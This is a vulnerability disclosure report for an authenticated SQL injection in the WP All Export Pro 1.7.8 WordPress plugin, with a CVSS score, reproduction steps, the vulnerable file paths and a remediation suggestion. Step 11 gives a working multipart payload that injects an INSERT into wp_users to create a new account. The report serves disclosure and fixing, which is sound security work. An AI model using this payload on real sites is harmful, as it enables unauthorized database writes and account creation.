# SQL Injection in WP ALL Export Pro(Non-Admin)

**Severity**: High

**Affected Product**

WP ALL Export (All Export Pro Plugin for WordPress)

**Version:** 1.7.8

**Description**

SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.

**Overall CVSS v3.1 score**: 8.3

**CVSS Reference Link:** [https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:W/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:L/MPR:L/MUI:N/MS:U/MC:H/MI:H/MA:H&version=3.1](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:W/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:L/MPR:L/MUI:N/MS:U/MC:H/MI:H/MA:H&version=3.1)

**Technical Impact**

Attacker can execute any SQL command in the database. If successfully exploited, impact could cover loss of confidentiality, loss of integrity, loss of availability, and/or loss of accountability.

**Suggested Remediation**

- Implement proper authorization check to ensure the required fields are updated by the admin role only.

**Steps to Reproduce**

1. Install the “WP All Export Pro” plugin after buying and following the official installation instruction
    
    **URL:**  [https://wordpress.org/plugins/wp-all-export/#installation](https://wordpress.org/plugins/wp-all-export/#installation)
    
2. Click on the “New Export” and select Posts from the drop-down menu for Specific Post Type
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled.png)
    
3. Keep the default option on the next page and select “Continue”
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%201.png)
    
4. Select the checkbox of “Allow non-admins to run into the export in Client Mode” to give the access to the non-admin users
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%202.png)
    
5. Export is completed successfully.
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%203.png)
    
6. Open the Settings and give any of the users the access of the exports (In this case, author role is selected)
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%204.png)
    
7. Now, logout from the admin account and login into the author role account
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%205.png)
    
8. User (Non-Admin) will be able to see all the export for which admin has given the permissions.
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%206.png)
    
9. Click on “Run Export” for any of the export
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%207.png)
    
10. Click on the “Confirm & Run Export” and intercept this request into any of the proxy tool like burpsuite.
    
    Request path: /wordpress/wp-admin/admin.php?page=pmxe-admin-manage&id=32&action=update
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%208.png)
    
11. Add the below fields and turn the intercept off
    
    ```jsx
    -----WebKitFormBoundaryiJPFIleVAGMODGts
    Content-Disposition: form-data; name="cc_type[]"
    sql
    ------WebKitFormBoundaryiJPFIleVAGMODGts
    Content-Disposition: form-data; name="cc_code[]"
    test
    ------WebKitFormBoundaryiJPFIleVAGMODGts
    Content-Disposition: form-data; name="cc_php[]"
    test
    ------WebKitFormBoundaryiJPFIleVAGMODGts
    Content-Disposition: form-data; name="cc_sql[]"
    insert into wp_users (user_login, user_pass,user_nicename,user_email,user_url,user_activation_key,display_name)values('qwerty_test','password','nicename','user_email','user_url','user_activation_key','display_name')
    ```
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%209.png)
    
12. Export is completed
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%2010.png)
    
13. Observe that one new entry in the wp_users table cause of the insert payload in the step 12
    
    ![Untitled](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%2011.png)
    

*Note:  Attacker can exploit the same flow by selecting another Post Type like Comments, Taxonomies.*

**References**

- **Vulnerable Code Snippets**
    1. **cc_type** value from the post request is getting used in the switch statement and in case of **‘sql’**, **cc_sql($fieldSql) value(payload)** is being used into **the $wpdb-prepare function (Sink)**
        
        ![*File path: libraries/XmlExportCpt.php#L498-513*](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%2012.png)
        
        *File path: libraries/XmlExportCpt.php#L498-513*
        
        *Note: Same vulnerable code flow is available in other Post Types like Comments, Taxonomies.*
        
    2. Post Type: Taxonomy
        
        ![*File path: libraries/XmlExportTaxonomy.php#L370-390*](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%2013.png)
        
        *File path: libraries/XmlExportTaxonomy.php#L370-390*
        
    3. Post Type: Comment
        
        ![*File path: libraries/XmlExportComment.php#L340-354*](SQL%20Injection%20in%20WP%20ALL%20Export%20Pro(Non-Admin)%20d4c2122a97674f16aab791b1cffcb2ec/Untitled%2014.png)
        
        *File path: libraries/XmlExportComment.php#L340-354*
        
    
    - **Links**
        - Burpsuite Tool: [https://portswigger.net/burp](https://portswigger.net/burp)